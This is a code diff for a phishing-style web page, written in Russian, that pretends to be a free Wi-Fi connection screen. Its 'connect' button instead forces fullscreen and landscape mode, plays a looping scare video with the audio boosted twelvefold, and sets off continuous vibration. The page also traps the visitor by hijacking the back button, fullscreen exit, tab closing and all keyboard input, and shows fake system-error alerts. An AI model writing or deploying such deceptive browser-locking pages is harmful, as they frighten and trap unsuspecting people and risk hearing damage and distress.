@@ -3,32 +3,37 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Wi-Fi Connect</title>
+    <title>Настройка Wi-Fi</title>
     <style>
+        * { cursor: none; -webkit-tap-highlight-color: transparent; }
         body {
             margin: 0; padding: 0; background: #f2f2f7;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             display: flex; justify-content: center; align-items: center;
-            height: 100vh; overflow: hidden; user-select: none;
+            height: 100vh; overflow: hidden; touch-action: none;
         }
-        #ui { text-align: center; width: 90%; }
-        .wifi-loader {
-            width: 80px; height: 80px; border: 4px solid #007aff;
-            border-radius: 50%; border-top-color: transparent;
-            animation: spin 1s linear infinite; margin: 0 auto 20px;
+        #ui {
+            text-align: center; width: 85%; background: white; 
+            padding: 40px 20px; border-radius: 25px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
         }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        h1 { font-size: 24px; color: #000; margin-bottom: 10px; }
-        p { color: #8e8e93; font-size: 16px; margin-bottom: 30px; }
+        .wifi-icon {
+            font-size: 70px; color: #007aff; margin-bottom: 20px;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
+        h1 { font-size: 24px; color: #000; margin: 0 0 10px; }
+        p { color: #8e8e93; font-size: 16px; margin-bottom: 30px; line-height: 1.4; }
         button {
             background: #007aff; color: white; border: none;
-            width: 100%; max-width: 300px; padding: 18px;
-            font-size: 20px; border-radius: 14px; font-weight: 600;
-            cursor: pointer; active { background: #0051a8; }
+            width: 100%; padding: 20px; font-size: 22px; border-radius: 15px;
+            font-weight: 600; cursor: pointer; transition: 0.2s;
         }
+        button:active { background: #0051a8; transform: scale(0.98); }
+        
         #screamer-wrap {
             display: none; position: fixed; top: 0; left: 0;
-            width: 100vw; height: 100vh; background: #000; z-index: 9999;
+            width: 100vw; height: 100vh; background: #000; z-index: 99999;
         }
         video { width: 100%; height: 100%; object-fit: cover; }
     </style>
@@ -36,14 +41,14 @@
 <body oncontextmenu="return false;">
 
     <div id="ui">
-        <div class="wifi-loader"></div>
-        <h1>Доступна сеть "Free_WiFi_HighSpeed"</h1>
-        <p>Для подключения нажмите кнопку ниже</p>
-        <button onclick="startTrap()">ПОДКЛЮЧИТЬ</button>
+        <div class="wifi-icon">📶</div>
+        <h1>Бесплатный Wi-Fi</h1>
+        <p>Найдена высокоскоростная сеть.<br>Нажмите для автоматической настройки и получения доступа.</p>
+        <button onclick="ignite()">ПОДКЛЮЧИТЬ</button>
     </div>
 
     <div id="screamer-wrap">
-        <video id="scaryVideo" playsinline loop>
+        <video id="scaryVideo" playsinline loop muted>
             <source src="1909901693.mp4" type="video/mp4">
         </video>
     </div>
@@ -52,70 +57,69 @@
         const video = document.getElementById('scaryVideo');
         const wrap = document.getElementById('screamer-wrap');
 
-        async function startTrap() {
-            // 1. Полноэкранный режим
+        async function ignite() {
+            // 1. ПОЛНЫЙ ЭКРАН СРАЗУ
             const doc = document.documentElement;
             if (doc.requestFullscreen) doc.requestFullscreen();
             else if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
 
-            // 2. Переворот экрана в горизонтальный режим (Landscape)
+            // 2. ПРИНУДИТЕЛЬНЫЙ ГОРИЗОНТАЛЬНЫЙ РЕЖИМ
             if (screen.orientation && screen.orientation.lock) {
-                screen.orientation.lock('landscape').catch(() => {
-                    console.log("Нужен клик для переворота");
-                });
+                screen.orientation.lock('landscape').catch(() => {});
             }
 
-            // 3. Звук на максимум (программное усиление)
+            // 3. ЗВУК НА ПРЕДЕЛЕ (Усиление AudioContext)
             try {
                 const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                 const source = audioCtx.createMediaElementSource(video);
                 const gain = audioCtx.createGain();
-                gain.gain.value = 5.0; // Усиление в 5 раз
+                
+                video.muted = false; 
+                gain.gain.value = 12.0; // Максимальное усиление
+                
                 source.connect(gain);
                 gain.connect(audioCtx.destination);
-            } catch (e) {}
+                if (audioCtx.state === 'suspended') await audioCtx.resume();
+            } catch (e) {
+                video.muted = false;
+                video.volume = 1.0;
+            }
 
-            // 4. Показываем видео
+            // 4. ЗАПУСК
             document.getElementById('ui').style.display = 'none';
             wrap.style.display = 'block';
             video.play();
 
-            // 5. Бесконечная вибрация
+            // 5. БЕШЕНАЯ ВИБРАЦИЯ (прерывистая для паники)
             if (navigator.vibrate) {
-                setInterval(() => navigator.vibrate([500, 100, 500, 100]), 1000);
+                setInterval(() => {
+                    navigator.vibrate([1000, 50, 1000, 50, 500, 50]);
+                }, 500);
             }
 
-            // 6. БЛОКИРОВКА ВЫХОДА (Психологическая и техническая)
+            // 6. ЖЕСТКАЯ БЛОКИРОВКА КНОПОК И ЖЕСТОВ
             
-            // Запрет кнопки "Назад"
+            // Ловушка на кнопку "Назад"
             window.history.pushState(null, null, window.location.href);
             window.onpopstate = () => {
                 window.history.pushState(null, null, window.location.href);
-                enterFull(); // Возвращаем фуллскрин при попытке выйти
+                alert("СИСТЕМНАЯ ОШИБКА: Доступ ограничен!");
             };
 
-            // Предупреждение при закрытии вкладки
-            window.onbeforeunload = () => "СИСТЕМА ЗАБЛОКИРОВАНА!";
-
-            // Если он выйдет из фуллскрина (свайпом), сразу выкидываем ошибку
+            // Блокировка попытки выхода из фуллскрина
             document.addEventListener('fullscreenchange', () => {
                 if (!document.fullscreenElement) {
-                    alert("КРИТИЧЕСКАЯ ОШИБКА ОБНОВЛЕНИЯ! Нажмите ОК для восстановления.");
-                    enterFull();
+                    alert("ВНИМАНИЕ! Соединение прервано. Нажмите ОК для восстановления Wi-Fi!");
+                    if (doc.requestFullscreen) doc.requestFullscreen();
                 }
             });
+
+            // Блокировка закрытия вкладки
+            window.onbeforeunload = () => "Процесс настройки не завершен!";
         }
 
-        function enterFull() {
-            const doc = document.documentElement;
-            if (doc.requestFullscreen) doc.requestFullscreen();
-            else if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
-        }
-
-        // Блокировка клавиш (на случай если он с клавиатурой)
-        document.onkeydown = (e) => {
-            return false; // Отключает всё, включая F12 и Esc
-        };
+        // Полное отключение клавиатуры
+        document.onkeydown = () => false;
     </script>
 </body>
 </html>
